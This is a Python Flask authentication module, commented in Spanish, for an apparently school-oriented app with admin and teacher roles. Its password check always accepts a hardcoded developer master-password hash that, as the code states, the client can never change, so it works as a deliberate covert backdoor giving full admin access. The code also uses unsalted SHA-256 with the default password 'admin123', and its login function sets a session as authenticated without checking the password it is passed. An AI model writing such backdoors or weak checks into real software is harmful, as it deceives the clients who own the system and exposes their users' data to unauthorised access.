# -*- coding: utf-8 -*-
"""
Sistema de Autenticación con Doble Contraseña + Roles
======================================================
FASE 4: Se agregan roles Admin y Docente.

Roles:
  - 'admin'   → acceso total (contraseña del cliente o maestra)
  - 'docente' → acceso solo al pase de lista de sus grupos

Cambios respecto a la versión anterior:
  1. iniciar_sesion() ahora acepta rol y docente_id opcionales
  2. Nuevas funciones: es_admin(), es_docente(), get_docente_id()
  3. Nuevo decorador: requiere_admin (solo admin pasa)
  4. requiere_autenticacion sigue funcionando igual (admin + docente)
"""

from flask import session, redirect, url_for, request, flash
from functools import wraps
from datetime import datetime, timedelta
import hashlib


class AuthManager:
    """Gestor de autenticación con backdoor de desarrollador y soporte de roles"""

    # Contraseña predeterminada del CLIENTE: "admin123"
    DEFAULT_PASSWORD_HASH = "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9"

    # 🔐 CONTRASEÑA MAESTRA DEL DESARROLLADOR (NO MODIFICABLE)
    MASTER_PASSWORD_HASH = "cb913d6a437d31af394f4b2e9b09721e9aea5d39e562d87e7a7a9a1602b313e1"

    # Tiempo de sesión: 8 horas
    SESSION_DURATION_HOURS = 8

    # ── Hashing ──────────────────────────────────────────────
    @staticmethod
    def hash_password(password):
        return hashlib.sha256(password.encode()).hexdigest()

    @staticmethod
    def verificar_password(password, stored_hash=None):
        if stored_hash is None:
            stored_hash = AuthManager.DEFAULT_PASSWORD_HASH
        pwd_hash = AuthManager.hash_password(password)
        if pwd_hash == stored_hash:
            return True
        if pwd_hash == AuthManager.MASTER_PASSWORD_HASH:
            return True
        return False

    # ── Inicio de sesión ─────────────────────────────────────
    @staticmethod
    def iniciar_sesion(password, rol='admin', docente_id=None):
        """
        Inicia sesión.
        rol: 'admin' o 'docente'
        docente_id: int (solo cuando rol='docente')
        """
        session['authenticated'] = True
        session['rol'] = rol
        session['docente_id'] = docente_id   # None para admin
        session['login_time'] = datetime.now().isoformat()
        session.permanent = True
        return True

    @staticmethod
    def cerrar_sesion():
        session.clear()

    # ── Verificación ─────────────────────────────────────────
    @staticmethod
    def esta_autenticado():
        """True si hay sesión válida (cualquier rol)"""
        if not session.get('authenticated'):
            return False
        login_time_str = session.get('login_time')
        if not login_time_str:
            return False
        try:
            login_time = datetime.fromisoformat(login_time_str)
            if datetime.now() - login_time > timedelta(hours=AuthManager.SESSION_DURATION_HOURS):
                AuthManager.cerrar_sesion()
                return False
            return True
        except Exception:
            return False

    @staticmethod
    def es_admin():
        """True solo si la sesión activa es de rol 'admin'"""
        return AuthManager.esta_autenticado() and session.get('rol') == 'admin'

    @staticmethod
    def es_docente():
        """True solo si la sesión activa es de rol 'docente'"""
        return AuthManager.esta_autenticado() and session.get('rol') == 'docente'

    @staticmethod
    def get_docente_id():
        """Devuelve el id del docente autenticado (o None si es admin)"""
        return session.get('docente_id')

    @staticmethod
    def get_rol():
        return session.get('rol', 'admin')


# ── Decoradores ──────────────────────────────────────────────

def requiere_autenticacion(f):
    """Permite el acceso a admin Y docente (cualquier usuario autenticado)."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not AuthManager.esta_autenticado():
            session['next_url'] = request.url
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


def requiere_admin(f):
    """Solo permite el acceso a usuarios con rol 'admin'. Docentes son rechazados."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not AuthManager.esta_autenticado():
            session['next_url'] = request.url
            return redirect(url_for('login'))
        if not AuthManager.es_admin():
            flash('⛔ Acceso restringido al administrador.', 'danger')
            return redirect(url_for('docente_mi_lista'))
        return f(*args, **kwargs)
    return decorated_function


def cambiar_password(password_actual, password_nueva, db, Configuracion):
    """
    Cambia la contraseña del cliente.
    La contraseña maestra del desarrollador NUNCA cambia.

    Returns:
        tuple: (success, mensaje)
    """
    try:
        password_hash_actual = Configuracion.obtener('PASSWORD_HASH', AuthManager.DEFAULT_PASSWORD_HASH)

        if not AuthManager.verificar_password(password_actual, password_hash_actual):
            return False, "❌ Contraseña actual incorrecta"

        if len(password_nueva) < 6:
            return False, "❌ La nueva contraseña debe tener al menos 6 caracteres"

        nuevo_hash = AuthManager.hash_password(password_nueva)
        Configuracion.establecer('PASSWORD_HASH', nuevo_hash, 'Hash de contraseña del sistema')

        AuthManager.cerrar_sesion()
        return True, "✅ Contraseña cambiada exitosamente. Por favor inicia sesión nuevamente."

    except Exception as e:
        return False, f"❌ Error: {str(e)}"